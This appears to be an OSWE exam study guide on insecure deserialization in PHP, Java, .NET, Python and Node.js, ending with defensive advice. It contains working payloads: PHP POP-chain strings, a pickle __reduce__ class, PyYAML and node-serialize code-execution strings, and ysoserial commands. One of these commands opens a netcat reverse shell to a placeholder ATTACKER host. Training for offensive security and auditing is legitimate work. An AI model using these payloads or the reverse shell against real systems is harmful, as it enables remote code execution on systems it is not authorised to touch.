# Domain 3: Insecure Deserialization & Gadget Chains — Study Guide

> **Exam weight:** a premier OSWE RCE primitive. Deserialization turns attacker-controlled bytes back into live objects; if the app deserialises untrusted data and a suitable *gadget* exists, you get code execution. White-box review is ideal — you can *see* the `readObject`/`unserialize`/`pickle.loads` sink and the classes on the classpath.

---

## 0. Why Deserialization Is Dangerous

Serialization converts objects to bytes; deserialization rebuilds them. The danger: rebuilding an object can invoke methods automatically (constructors, magic methods, type handlers). A **gadget chain** strings together classes already present in the app so that the act of deserialising triggers a sequence ending in command execution — the attacker supplies *data*, not code, but the data drives existing code to RCE.

```text
   [ attacker bytes ] ─► deserialiser ─► object graph rebuilt
                                           │ (auto-invoked magic/type handling)
                                           ▼
                                  gadget1 → gadget2 → ... → exec/Runtime/Process
```

**Audit target:** find the sink (`readObject`, `unserialize`, `BinaryFormatter.Deserialize`, `pickle.loads`, `yaml.load`, `node-serialize`), confirm it receives untrusted input, then identify an available gadget.

---

## 1. PHP Deserialization

`unserialize($userinput)` rebuilds objects and auto-invokes **magic methods**:

- `__wakeup()` on unserialize, `__destruct()` on object destruction, `__toString()` when used as a string, `__call()` on missing-method calls.
- A **POP chain** (Property-Oriented Programming) sets object properties so that these magic methods cascade into a dangerous operation (file write, `system`, SQL). You build the serialized string by instantiating the classes locally and serialising them.

```php
// VULNERABLE sink
$obj = unserialize($_COOKIE['data']);
// If a class on the codebase has __destruct(){ eval($this->code); } (or writes a file),
// craft: O:7:"ClassX":1:{s:4:"code";s:10:"system('id');";}
```

### 1.1 `phar://` deserialization

PHAR archives store serialized metadata. When *any* filesystem function (`file_exists`, `filesize`, `md5_file`, `fopen`, …) is called on a `phar://` path, PHP **deserialises the metadata automatically** — no explicit `unserialize` needed. Upload a polyglot (valid JPEG + valid PHAR) so an image-handling routine triggers metadata deserialization, kicking off your POP chain.

**Audit rule:** any filesystem function operating on an attacker-influenced path is a potential phar-deserialization sink.

---

## 2. Java Deserialization

`ObjectInputStream.readObject()` on untrusted bytes is the canonical Java sink. Gadget chains use classes on the classpath:

- **`ysoserial`** generates payloads for known chains: **CommonsCollections** (1–7), **Spring**, **TemplatesImpl** (injects compiled bytecode that runs on instantiation), and more. You pick a chain whose library is present.
- Other sinks: **`XMLDecoder`** (executes constructed objects from XML), **`XStream`**, **Jackson** with `enableDefaultTyping()`/polymorphic typing (deserialises arbitrary types), **SnakeYAML** `Yaml.load()` (instantiates arbitrary classes).
- **JNDI injection:** a gadget (or a logging/`lookup` sink) that performs `InitialContext.lookup(attackerURL)` can fetch and instantiate a remote object (LDAP/RMI), classic RCE (the Log4Shell family).

```text
# generate a Commons-Collections payload and send it to the readObject sink
java -jar ysoserial.jar CommonsCollections6 'nc -e /bin/sh ATTACKER 4444' | base64
```

**Audit approach:** find `readObject`/`XMLDecoder`/`Yaml.load`/`enableDefaultTyping`, then check `pom.xml`/libs for a vulnerable gadget library and match a ysoserial chain.

---

## 3. .NET Deserialization

Dangerous formatters: **`BinaryFormatter`**, **`SoapFormatter`**, **`NetDataContractSerializer`**, **`LosFormatter`/`ObjectStateFormatter`**, and **Json.NET** with `TypeNameHandling.All`/`Auto`.

- **`ysoserial.net`** produces gadget payloads (e.g. `ObjectDataProvider` → `Process.Start`) for these formatters.
- **ViewState (`__VIEWSTATE`):** ASP.NET serialises ViewState with `LosFormatter`/`ObjectStateFormatter`. If MAC validation is enabled, you need the `machineKey` (`validationKey`/`decryptionKey`). If those leak (via LFI/SQLi reading `web.config`), you can forge a signed malicious ViewState (ysoserial.net `TypeConfuseDelegate` + the keys) for RCE.
- **Json.NET:** `TypeNameHandling.All`/`Auto` lets the JSON specify the type to instantiate — `$type: ObjectDataProvider` reaching `Process.Start`.

**Audit rule:** `TypeNameHandling` other than `None`, any `BinaryFormatter.Deserialize` on request data, and ViewState without MAC (or with a leaked key) are all RCE candidates.

---

## 4. Python Deserialization

- **`pickle.loads()` / `cPickle`:** pickle supports a `__reduce__` method that returns a callable + args executed on load. A malicious pickle is trivial RCE:
  ```python
  class E:
      def __reduce__(self): return (__import__('os').system, ('id',))
  # pickle.dumps(E()) → sent to a pickle.loads() sink → runs `id`
  ```
- **PyYAML `yaml.load()`** (without `SafeLoader`): `!!python/object/apply:os.system ['id']` instantiates/calls arbitrary Python. Fix: `yaml.safe_load`.
- **`jsonpickle`** can reconstruct arbitrary objects similarly if fed untrusted input.

**Audit rule:** `pickle.loads`, `yaml.load` (no `SafeLoader`), and `jsonpickle.decode` on untrusted data are direct RCE sinks.

---

## 5. Node.js Deserialization

- **`node-serialize`:** its format supports functions; the immediately-invoked-function trick executes on `unserialize`:
  ```text
  {"x":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
  ```
  The trailing `()` makes the function self-invoke during deserialization.
- **`funcster`** and **`cryo`** have analogous function-reconstruction behaviour.

**Audit rule:** any use of `node-serialize`/`funcster`/`cryo` on request data is an RCE sink; grep for `unserialize(` from these packages.

---

## 6. Building and Delivering the Chain (exploit automation)

For the OSWE script:
1. **Generate the payload** — call `ysoserial`/`ysoserial.net` as a subprocess, or construct the serialized blob in-language (PHP/Python/JS) inside your Python exploit (e.g. shell out to `php -r` to build a POP chain).
2. **Deliver it** to the sink (cookie, body, upload, ViewState field), with correct encoding (base64, URL-encode).
3. **Catch the shell** with your listener thread.
4. For **phar** or **JNDI**, host the polyglot/remote object from the script's `ThreadingHTTPServer`/LDAP listener and point the target at it.

---

## 7. Defensive & Reporting Takeaways

- **Never deserialise untrusted input** with a dangerous deserialiser. Prefer data-only formats (JSON without type handling) and validated schemas.
- **Java:** use look-ahead/allow-list `ObjectInputStream` filtering (JEP 290), avoid `enableDefaultTyping`, keep gadget libraries patched.
- **.NET:** avoid `BinaryFormatter` (deprecated/dangerous), `TypeNameHandling=None`, enable and protect ViewState MAC, rotate `machineKey` if leaked.
- **PHP:** avoid `unserialize` on user data (use JSON); be aware of phar triggers on filesystem calls.
- **Python:** `yaml.safe_load`, never `pickle` untrusted data.
- **Node.js:** do not use function-capable deserialisers on request data.

---

## Key Audit & Exploit Commands

```bash
grep -rniE "readObject|unserialize|BinaryFormatter|pickle.loads|yaml.load|node-serialize|TypeNameHandling|XMLDecoder|SnakeYAML" src/
java -jar ysoserial.jar CommonsCollections6 'CMD' | base64      # Java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "CMD"        # .NET
php -r '...build POP chain...; echo serialize($o);'             # PHP
```

➡️ **Next:** [Exercises.md](./Exercises.md), then [Quiz_1](./Quiz_1.md) (PHP/Python), [Quiz_2](./Quiz_2.md) (Java/.NET), [Quiz_3](./Quiz_3.md) (Node.js & sink hunting).
